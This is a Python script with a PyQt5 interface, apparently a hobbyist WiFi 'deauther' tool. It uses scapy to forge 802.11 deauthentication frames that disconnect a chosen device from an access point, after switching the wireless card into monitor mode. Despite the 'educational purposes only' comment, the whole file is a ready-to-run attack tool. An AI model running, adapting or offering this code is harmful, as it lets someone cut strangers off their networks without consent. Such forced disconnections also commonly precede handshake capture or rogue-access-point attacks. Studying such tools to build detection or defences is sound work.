#this is just a simple script for educational purposes only
#sudo apt-get install python3-pyqt5
import subprocess
from scapy.all import *
from PyQt5.QtWidgets import *
import sys

class MainWindow(QWidget):
  def __init__(self):
    super().__init__()

    self.setWindowTitle("D34uther")
    self.setGeometry(0,0,300,100)
    vertical=QVBoxLayout()

    self.BssidLine=QLineEdit()
    self.BssidLine.setPlaceholderText("BSSID")
    self.TargetLine=QLineEdit()
    self.TargetLine.setPlaceholderText("Target MAC")
    self.InterfaceLine=QLineEdit()
    self.InterfaceLine.setPlaceholderText("Interface")
    self.CountLine=QLineEdit()
    self.CountLine.setPlaceholderText("Count")

    self.StartBtn=QPushButton("Start",self)
    self.StartBtn.clicked.connect(self.starta)

    vertical.addWidget(self.BssidLine)
    vertical.addWidget(self.TargetLine)
    vertical.addWidget(self.InterfaceLine)
    vertical.addWidget(self.CountLine)

    vertical.addWidget(self.StartBtn)

    self.setLayout(vertical)
    self.show()

  def starta(self):
      interface=self.InterfaceLine.text()
      bssid=self.BssidLine.text()
      targetmac=self.TargetLine.text()
      countt=int(self.CountLine.text())

      subprocess.call(["service","NetworkManager","stop"])
      subprocess.call(["ifconfig", interface, "down"])
      subprocess.call(["iwconfig", interface, "mode", "monitor"])
      subprocess.call(["ifconfig", interface, "up"])

      dot11 = Dot11(addr1=targetmac, addr2=bssid, addr3=bssid)
      packet = RadioTap()/dot11/Dot11Deauth(reason=7)
      sendp(packet, inter=0.1, count=countt, iface=interface, verbose=1)

      subprocess.call(["ifconfig", interface, "down"])
      subprocess.call(["iwconfig", interface, "mode", "managed"])
      subprocess.call(["ifconfig", interface, "up"])
      subprocess.call(["service","NetworkManager","start"])
      
        
Deauther=QApplication(sys.argv)
Window=MainWindow()
sys.exit(Deauther.exec_())